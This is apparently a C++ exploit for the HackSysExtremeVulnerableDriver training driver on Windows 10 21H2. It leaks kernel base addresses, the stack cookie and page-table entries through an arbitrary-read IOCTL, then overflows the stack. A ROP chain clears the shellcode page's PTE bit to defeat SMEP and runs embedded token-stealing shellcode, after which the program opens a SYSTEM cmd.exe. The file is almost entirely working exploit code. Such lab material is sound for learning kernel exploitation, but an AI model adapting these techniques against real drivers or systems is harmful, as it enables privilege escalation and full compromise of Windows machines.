// HEVD_STACKGS.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
//

#include <Windows.h>
#include <Psapi.h>
//#include <sysinfoapi.h>

#pragma warning(disable:4996) 
#include <sphelper.h>
#pragma warning(default: 4996)

#include <iostream>

HANDLE hevd;
uint64_t RSP = 0;
uint64_t RSP2 = 0;

//offsets

uint32_t MiGetPteAddressOffset = 0x221EF0;

typedef struct _WRITE_WHAT_WHERE {
	uintptr_t           What;
	uintptr_t           Where;
} WRITE_WHAT_WHERE;

typedef struct _ARBITRARY_READ {
	uintptr_t           readAddress;
	uintptr_t           outBuf;
} ARBITRARY_READ;

typedef LONG       KPRIORITY;
typedef struct _CLIENT_ID {
	DWORD          UniqueProcess;
	DWORD          UniqueThread;
} CLIENT_ID;

typedef struct _UNICODE_STRING {
	USHORT         Length;
	USHORT         MaximumLength;
	PWSTR          Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING* PUNICODE_STRING;
typedef const UNICODE_STRING* PCUNICODE_STRING;

typedef VOID(NTAPI* my_RtlInitUnicodeString) (
	PUNICODE_STRING DestinationString,
	PCWSTR SourceString
	);

typedef BOOLEAN(WINAPI* my_RtlEqualUnicodeString)(
	PCUNICODE_STRING String1,
	PCUNICODE_STRING String2,
	BOOLEAN          CaseInSensitive
	);



//from http://boinc.berkeley.edu/android-boinc/boinc/lib/diagnostics_win.h
typedef struct _VM_COUNTERS {
	// the following was inferred by painful reverse engineering
	SIZE_T		   PeakVirtualSize;	// not actually
	SIZE_T         PageFaultCount;
	SIZE_T         PeakWorkingSetSize;
	SIZE_T         WorkingSetSize;
	SIZE_T         QuotaPeakPagedPoolUsage;
	SIZE_T         QuotaPagedPoolUsage;
	SIZE_T         QuotaPeakNonPagedPoolUsage;
	SIZE_T         QuotaNonPagedPoolUsage;
	SIZE_T         PagefileUsage;
	SIZE_T         PeakPagefileUsage;
	SIZE_T         VirtualSize;		// not actually
} VM_COUNTERS;

typedef enum _KWAIT_REASON
{
	Executive = 0,
	FreePage = 1,
	PageIn = 2,
	PoolAllocation = 3,
	DelayExecution = 4,
	Suspended = 5,
	UserRequest = 6,
	WrExecutive = 7,
	WrFreePage = 8,
	WrPageIn = 9,
	WrPoolAllocation = 10,
	WrDelayExecution = 11,
	WrSuspended = 12,
	WrUserRequest = 13,
	WrEventPair = 14,
	WrQueue = 15,
	WrLpcReceive = 16,
	WrLpcReply = 17,
	WrVirtualMemory = 18,
	WrPageOut = 19,
	WrRendezvous = 20,
	Spare2 = 21,
	Spare3 = 22,
	Spare4 = 23,
	Spare5 = 24,
	WrCalloutStack = 25,
	WrKernel = 26,
	WrResource = 27,
	WrPushLock = 28,
	WrMutex = 29,
	WrQuantumEnd = 30,
	WrDispatchInt = 31,
	WrPreempted = 32,
	WrYieldExecution = 33,
	WrFastMutex = 34,
	WrGuardedMutex = 35,
	WrRundown = 36,
	MaximumWaitReason = 37
} KWAIT_REASON;

typedef struct _SYSTEM_THREAD_INFORMATION {
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	KPRIORITY Priority;
	LONG BasePriority;
	ULONG ContextSwitchCount;
	ULONG ThreadState;
	KWAIT_REASON WaitReason;
#ifdef _WIN64
	ULONG Reserved[4];
#endif
}SYSTEM_THREAD_INFORMATION, * PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_EXTENDED_THREAD_INFORMATION
{
	SYSTEM_THREAD_INFORMATION ThreadInfo;
	PVOID StackBase;
	PVOID StackLimit;
	PVOID Win32StartAddress;
	PVOID TebAddress; /* This is only filled in on Vista and above */
	ULONG Reserved1;
	ULONG Reserved2;
	ULONG Reserved3;
} SYSTEM_EXTENDED_THREAD_INFORMATION, * PSYSTEM_EXTENDED_THREAD_INFORMATION;
typedef struct _SYSTEM_EXTENDED_PROCESS_INFORMATION
{
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER SpareLi1;
	LARGE_INTEGER SpareLi2;
	LARGE_INTEGER SpareLi3;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	ULONG ProcessId;
	ULONG InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	PVOID PageDirectoryBase;
	VM_COUNTERS VirtualMemoryCounters;
	SIZE_T PrivatePageCount;
	IO_COUNTERS IoCounters;
	SYSTEM_EXTENDED_THREAD_INFORMATION Threads[1];
} SYSTEM_EXTENDED_PROCESS_INFORMATION, * PSYSTEM_EXTENDED_PROCESS_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemExtendedProcessInformation = 57
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
    );


LPVOID drivers[0x500] = { 0 }; // Should be more than enough
DWORD cbNeeded;
LPVOID ntoskrnlBase = NULL, hevdBase = NULL;


DWORD _GetVersion()
{
	DWORD dwVersion = 0;
	DWORD dwMajorVersion = 0;
	DWORD dwMinorVersion = 0;
	DWORD dwBuild = 0;

	dwVersion = GetVersion();

	// Get the Windows version.

	dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
	dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));

	// Get the build number.

	if (dwVersion < 0x80000000)
		dwBuild = (DWORD)(HIWORD(dwVersion));

	printf("Version is %d.%d (%d)\n",
		dwMajorVersion,
		dwMinorVersion,
		dwBuild);

	return dwVersion;
}

LPVOID LeakModuleBaseAddress(char* module)
{
	LPVOID moduleBase = NULL;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
		for (int i = 0; i < cbNeeded / sizeof(LPVOID); i++) {
			char szDriver[0x100] = { 0 }; // Again, more than enough
			GetDeviceDriverBaseNameA(drivers[i], szDriver, 0x100);
			if (strcmp(module, szDriver) == 0) {
				moduleBase = drivers[i];
				printf("[+] Found %s at: 0x%p\n", module, moduleBase);
			}

			if (moduleBase) break;
		}
	}
	else {
		printf("[-] Failed EnumDeviceDrivers: %d\n", GetLastError());
		return NULL;
	}

	if (!moduleBase) {
		printf("[-] Failed to find the base of %s\n",module);
		return NULL;
	}
	else
	{
		return moduleBase;
	}

}



uint64_t leakAddress(HANDLE hevd, uint64_t address)
{
	printf("[-] leakStackAddress");

	ARBITRARY_READ aread = {};
	uint64_t ReadValue = 0;
	aread.readAddress = address;
	aread.outBuf = (uint64_t)&ReadValue;
	DWORD BytesReturned;


	bool res = DeviceIoControl(
		hevd,
		0x22200B,
		&aread,
		sizeof(aread),
		NULL,
		0,
		&BytesReturned,
		NULL
	);

	DWORD err = GetLastError();
	printf("[+] DeviceIoControl, error: %p\n", err);


	printf("aread.readAddress: 0x%llx\n", aread.readAddress);
	printf("ReadValue: 0x%llx\n", ReadValue);

	return ReadValue;
}

int leakStackLimits()
{

	printf("[-] leakStackLimits\n");

	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	UNICODE_STRING myProc = { 0 };
	my_RtlInitUnicodeString myRtlInitUnicodeString = (my_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
	my_RtlEqualUnicodeString myRtlEqualUnicodeString = (my_RtlEqualUnicodeString)GetProcAddress(ntdll, "RtlEqualUnicodeString");
	if (myRtlInitUnicodeString == NULL || myRtlEqualUnicodeString == NULL) {
		printf("[-] Failed initializing unicode functions\n");
		return 0;
	}

    
    PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (query == NULL) {
        printf("GetProcAddress() failed.\n");
        return 0;
    }
    ULONG len = 2000;
    NTSTATUS status = NULL;
    PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL;
    do {
        len *= 2;
        pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
        status = query(SystemExtendedProcessInformation, pProcessInfo, len, &len);
    } while (status == (NTSTATUS)0xc0000004);
    if (status != (NTSTATUS)0x0) {
        printf("NtQuerySystemInformation failed with error code 0x%X\n", status);
        return 0;
    }

	myRtlInitUnicodeString(&myProc, L"HEVD_STACKGS.exe");

    while (pProcessInfo->NextEntryOffset != NULL) {
		if (myRtlEqualUnicodeString(&(pProcessInfo->ImageName), &myProc, TRUE)) {
			printf("[*] Process: %wZ\n", pProcessInfo->ImageName);
			for (unsigned int i = 0; i < pProcessInfo->NumberOfThreads; i++) {
				PVOID stackBase = pProcessInfo->Threads[i].StackBase;
				PVOID stackLimit = pProcessInfo->Threads[i].StackLimit;
#ifdef _WIN64

				if (i == 0)
				{
					printf("Stack base 0x%llx\n", stackBase);
					printf("Stack limit 0x%llx\n", stackLimit);

					RSP = (uint64_t)stackBase - 0xac0;
					printf("Stack RSP location used in XOR:  0x%llx\r\n", RSP);

				}

#else
				printf("Stack base 0x%X\t", stackBase);
				printf("Stack limit 0x%X\r\n", stackLimit);
#endif
			}
		}
		
        pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo + pProcessInfo->NextEntryOffset);
    }
    return 1;
}

uintptr_t getPteAddress(PVOID addr, PVOID base)
{
	uintptr_t address = (uintptr_t)addr;
	address = address >> 9;
	address &= 0x7FFFFFFFF8;
	address += (intptr_t)base;
	return address;
}

int main()
{

	DWORD version = _GetVersion();

	if (version != 0x23f00206) //Windows 10 21h2 19044.1586
	{
		printf("exploit not supported for this Windows OS. Yo need to adjust ROP gadgets and maybe the shellcode\n");
		system("pause");
		return -1;
	}

	hevd = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		0xC0000000,
		0,
		NULL,
		0x3,
		0,
		NULL);

	if (hevd == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open", GetLastError());
		//return 1;
	}
	else
	{
		printf("[-] Valid handle opened\n");
	}

	LPVOID moduleBaseNtos = LeakModuleBaseAddress((char*)"ntoskrnl.exe");
	LPVOID moduleBaseHevd = LeakModuleBaseAddress((char*)"HEVD.sys");
	leakStackLimits();

	uint64_t addrCookie = (uint64_t)moduleBaseHevd + 0x3000;
	uint64_t addrPte = (uint64_t)moduleBaseNtos + MiGetPteAddressOffset + 0x13;
	uint64_t Cookie = 0;
	uint64_t shellcodePTEBase = 0;
	uint64_t shellcodePTE = 0;
	uint64_t XoredCookie = 0;
	uint64_t extractedRSP = 0;
	uint64_t wantedPteValue = 0;
	bool res = 0;
	

	char TokenSteal[] = { 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x89,
		0xC3, 0x48, 0x8B, 0x9B, 0x48, 0x04, 0x00, 0x00, 0x48, 0x81, 0xEB, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x8B, 0x40, 0x04, 0x00,
		0x00, 0x48, 0x83, 0xF9, 0x04, 0x75, 0xE5, 0x48, 0x8B, 0x8B, 0xB8, 0x04, 0x00, 0x00, 0x80, 0xE1, 0xF0, 0x48, 0x89, 0x88, 0xB8,
		0x04, 0x00, 0x00, 0x48, 0x31, 0xC0, 0xC3 };

	LPVOID shellcode = VirtualAlloc(
		NULL,				// Next page to commit
		sizeof(TokenSteal),		        // Page size, in bytes
		MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
		PAGE_EXECUTE_READWRITE);	// Read/write access

	if (shellcode == NULL) {
		printf("[-] Unable to reserve memory for shellcode!\n");
		return -1;
	}
	memcpy(shellcode, (LPVOID)TokenSteal, sizeof(TokenSteal));

	//leak PTE
	shellcodePTEBase = leakAddress(hevd, addrPte);
	printf("shellcodePTEBase value: 0x%llx\n", shellcodePTEBase);

	shellcodePTE = getPteAddress(shellcode, (PVOID)shellcodePTEBase);
	printf("shellcodePTE value: 0x%llx\n", shellcodePTE);

	wantedPteValue = leakAddress(hevd, shellcodePTE);
	printf("wantedPteValue extracted value: 0x%llx\n", wantedPteValue);

	wantedPteValue = wantedPteValue & ~0x4;

	printf("wantedPteValue modified value: 0x%llx\n", wantedPteValue);

	//ExtractkCookie
	Cookie = leakAddress(hevd, addrCookie);
	printf("Cookie value: 0x%llx\n", Cookie);

	XoredCookie = RSP ^ Cookie;
	printf("XoredCookie value: 0x%llx\n", XoredCookie);

	DWORD BytesReturned;


    //llamada
    
    DWORD err = 0;
	BYTE InputBuffer[0x268];
    memset(InputBuffer, 0x41, sizeof(InputBuffer)); //0x200 bytes 

	memcpy(InputBuffer+0x200,&XoredCookie, sizeof(XoredCookie)); //0x208 - COOKIE

	DWORD offset_pop_rdx_ret = 0x64cddd; //0x14064cddd: pop rdx ; ret ;
	DWORD offset_pop_rax_ret = 0x69a150; //0x14069a150: pop rax ; ret ;
	DWORD offset_mov_rax_to_ptr_rdx_ret = 0x5db58f; //0x1405db58f: mov qword [rdx], rax ; ret ;
	DWORD offset_wbinvd = 0x37fe10; //0x14037fe10: wbinvd ; ret ;
	DWORD offset_ret = 0x64c734; //0x14064c734: ret ;

	//ROP CHAIN

	//change PTE bits
	*(ULONGLONG*)(InputBuffer + 0x220) = 0; //R12
	*(ULONGLONG*)(InputBuffer + 0x228) = 0x4D; //RDI
	*(ULONGLONG*)(InputBuffer + 0x230) = 0; //RSI
	*(ULONGLONG*)(InputBuffer + 0x238) = (ULONGLONG)((ULONGLONG)moduleBaseNtos + offset_pop_rdx_ret); //0x14056ccd2: pop rdx ; ret  ; 
	*(ULONGLONG*)(InputBuffer + 0x240) = (ULONGLONG)(shellcodePTE);
	*(ULONGLONG*)(InputBuffer + 0x248) = (ULONGLONG)((ULONGLONG)moduleBaseNtos + offset_pop_rax_ret); //0x1402017f2: pop rax ; ret  ; 
	*(ULONGLONG*)(InputBuffer + 0x250) = (ULONGLONG)(wantedPteValue);
	*(ULONGLONG*)(InputBuffer + 0x258) = (ULONGLONG)((ULONGLONG)moduleBaseNtos + offset_mov_rax_to_ptr_rdx_ret); //0x1402e3b79: mov qword [rdx], rax ; ret  ;
	*(ULONGLONG*)(InputBuffer + 0x260) = (ULONGLONG)((ULONGLONG)moduleBaseNtos + offset_ret); //HEVD+0X8a5f8: ret;


	printf("Sending frist call to IOCTL 0x222007\n");

    res = DeviceIoControl(
        hevd,
        0x222007,
        InputBuffer,
        sizeof(InputBuffer),
        NULL,
        0,
        &BytesReturned,
        NULL
    );

	
    err = GetLastError();
    printf("[+] DeviceIoControl, error: %p\n", err);

	//ROP
	//change PTE bits
	*(ULONGLONG*)(InputBuffer + 0x220) = 0x0; //R12
	*(ULONGLONG*)(InputBuffer + 0x228) = 0x4D; //RDI
	*(ULONGLONG*)(InputBuffer + 0x230) = 0x0; //RSI
	*(ULONGLONG*)(InputBuffer + 0x238) = (ULONGLONG)((ULONGLONG)moduleBaseNtos + offset_ret); //0x14056ccd2: pop rdx ; ret  ; 
	*(ULONGLONG*)(InputBuffer + 0x240) = (ULONGLONG)((ULONGLONG)moduleBaseNtos + offset_ret);
	*(ULONGLONG*)(InputBuffer + 0x248) = (ULONGLONG)((ULONGLONG)moduleBaseNtos + offset_ret);
	*(ULONGLONG*)(InputBuffer + 0x250) = (ULONGLONG)((ULONGLONG)moduleBaseNtos + offset_ret);
	*(ULONGLONG*)(InputBuffer + 0x258) = (ULONGLONG)((ULONGLONG)moduleBaseNtos + offset_wbinvd); //0x1402e3b79: mov qword [rdx], rax ; ret  ;
    *(ULONGLONG*)(InputBuffer + 0x260) = (ULONGLONG)(shellcode);

	printf("Sending second call to IOCTL 0x222007\n");

	res = DeviceIoControl(
		hevd,
		0x222007,
		InputBuffer,
		sizeof(InputBuffer),
		NULL,
		0,
		&BytesReturned,
		NULL
	);

	err = GetLastError();
	printf("[+] DeviceIoControl, error: %p\n", err);

    CloseHandle(hevd);

	system("cmd.exe");

    return 0;
}

// Ejecutar programa: Ctrl + F5 o menú Depurar > Iniciar sin depurar
// Depurar programa: F5 o menú Depurar > Iniciar depuración

// Sugerencias para primeros pasos: 1. Use la ventana del Explorador de soluciones para agregar y administrar archivos
//   2. Use la ventana de Team Explorer para conectar con el control de código fuente
//   3. Use la ventana de salida para ver la salida de compilación y otros mensajes
//   4. Use la ventana Lista de errores para ver los errores
//   5. Vaya a Proyecto > Agregar nuevo elemento para crear nuevos archivos de código, o a Proyecto > Agregar elemento existente para agregar archivos de código existentes al proyecto
//   6. En el futuro, para volver a abrir este proyecto, vaya a Archivo > Abrir > Proyecto y seleccione el archivo .sln
